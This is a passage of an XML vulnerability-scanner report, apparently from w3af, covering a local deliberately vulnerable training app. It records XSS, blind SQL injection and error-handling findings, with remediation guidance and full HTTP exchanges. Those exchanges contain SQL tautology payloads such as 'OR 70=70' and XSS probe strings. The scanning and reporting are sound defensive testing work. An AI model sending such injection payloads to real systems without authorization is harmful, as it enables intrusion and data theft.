            <header field="Date" content="Wed, 20 Mar 2024 17:18:07 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="47" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9eTJ2a3M6eTJ2a3Mgd2lkdGg9IjQwMCIgaGVpZ2h0PSIzMDAiLz4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[15708]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4" var="src">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;src=sueuv%3Asueuv&quot; The modified parameter was &quot;src&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="15708">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4?src=sueuv%3Asueuv HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:15 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="47" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9c3VldXY6c3VldXYgd2lkdGg9IjQwMCIgaGVpZ2h0PSIzMDAiLz4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[16322, 16403]" method="GET" name="Blind SQL injection vulnerability" plugin="blind_sqli" severity="High" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3" var="src">
    <description>Blind SQL injection was found at: &quot;b'http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3'&quot;, using HTTP method b'GET'. The injectable parameter is: &quot;b'src'&quot;. </description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.



Injection was detected as it was possible to inject specific SQL
queries, that if vulnerable, result in the responses for each
injection being different. This is known as a blind SQL injection
vulnerability.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="MITRE - CAPEC" url="http://capec.mitre.org/data/definitions/7.html" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/Blind_SQL_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="16322">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3?src=70%20OR%2070%3D70%20OR%2070%3D70%20 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:33 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="104" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9MjQmcXVvdDsgT1IgJnF1b3Q7MjQmcXVvdDs9JnF1b3Q7MjQmcXVvdDsgT1IgJnF1b3Q7MjQmcXVvdDs9JnF1b3Q7MjQgd2lkdGg9IjQwMCIgaGVpZ2h0PSIzMDAiLz4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="16403">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_3?src=70%20OR%2070%3D70%20OR%2070%3D70%20 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:34 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="72" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9MjQmcXVvdDsgQU5EICZxdW90OzI0JnF1b3Q7PSZxdW90OzI1IHdpZHRoPSI0MDAiIGhlaWdodD0iMzAwIi8+</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[16538]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1" var="value">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;value=&quot; The modified parameter was &quot;value&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="16538">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1?value=x7gds%3Cx7gdsx7gds--%3Ex7gdsx7gds%2A%2Fx7gdsx7gds%2A%2F%3A%28%22%27x7gdsx7gds%3Ax7gdsx7gds%0Ax7gdsx7gds%22x7gdsx7gds%27x7gdsx7gds%60x7gdsx7gds%20%3Dx7gds HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:35 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="129" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdj54N2dkczx4N2dkc3g3Z2RzLS0+eDdnZHN4N2dkcyoveDdnZHN4N2dkcyovOigiJ3g3Z2RzeDdnZHM6eDdnZHN4N2dkcwp4N2dkc3g3Z2RzIng3Z2RzeDdnZHMneDdnZHN4N2dkc2B4N2dkc3g3Z2RzID14N2dkczxkaXY+</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[16724]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_2" var="value">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;value=whgdx%3Cwhgdx&quot; The modified parameter was &quot;value&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="16724">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_2?value=whgdx%3Cwhgdx HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:39 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="21" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdj53aGdkeDx3aGdkeDxkaXY+</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[16787, 16832]" method="GET" name="Blind SQL injection vulnerability" plugin="blind_sqli" severity="High" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4" var="src">
    <description>Blind SQL injection was found at: &quot;b'http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4'&quot;, using HTTP method b'GET'. The injectable parameter is: &quot;b'src'&quot;. </description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.



Injection was detected as it was possible to inject specific SQL
queries, that if vulnerable, result in the responses for each
injection being different. This is known as a blind SQL injection
vulnerability.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="MITRE - CAPEC" url="http://capec.mitre.org/data/definitions/7.html" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/Blind_SQL_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="16787">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4?src=18%22%20OR%20%2218%22%3D%2218%22%20OR%20%2218%22%3D%2218 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:41 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="104" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9NjYmcXVvdDsgT1IgJnF1b3Q7NjYmcXVvdDs9JnF1b3Q7NjYmcXVvdDsgT1IgJnF1b3Q7NjYmcXVvdDs9JnF1b3Q7NjYgd2lkdGg9IjQwMCIgaGVpZ2h0PSIzMDAiLz4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="16832">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_4?src=18%22%20OR%20%2218%22%3D%2218%22%20OR%20%2218%22%3D%2218 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:41 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="72" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGltZyBzcmM9NjYmcXVvdDsgQU5EICZxdW90OzY2JnF1b3Q7PSZxdW90OzY3IHdpZHRoPSI0MDAiIGhlaWdodD0iMzAwIi8+</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[16883]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_3" var="value">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;value=&quot; The modified parameter was &quot;value&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="16883">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_3?value=xf3zg%3Cxf3zgxf3zg--%3Exf3zgxf3zg%2A%2Fxf3zgxf3zg%2A%2F%3A%28%22%27xf3zgxf3zg%3Axf3zgxf3zg%0Axf3zgxf3zg%22xf3zgxf3zg%27xf3zgxf3zg%60xf3zgxf3zg%20%3Dxf3zg HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:18:42 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="129" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdj54ZjN6Zzx4ZjN6Z3hmM3pnLS0+eGYzemd4ZjN6ZyoveGYzemd4ZjN6ZyovOigiJ3hmM3pneGYzemc6eGYzemd4ZjN6Zwp4ZjN6Z3hmM3pnInhmM3pneGYzemcneGYzemd4ZjN6Z2B4ZjN6Z3hmM3pnID14ZjN6ZzxkaXY+</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[234, 287, 293]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="234">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=2%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:34 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="23" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogdHJ1ZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="287">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=usEYsgC6 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:35 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="293">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:35 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[247, 418, 427]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="247">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2?id=2%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:35 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="23" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogdHJ1ZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="418">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2?id=p8k2FZqM HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:38 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="427">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_2?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:36 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[359, 647, 652]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
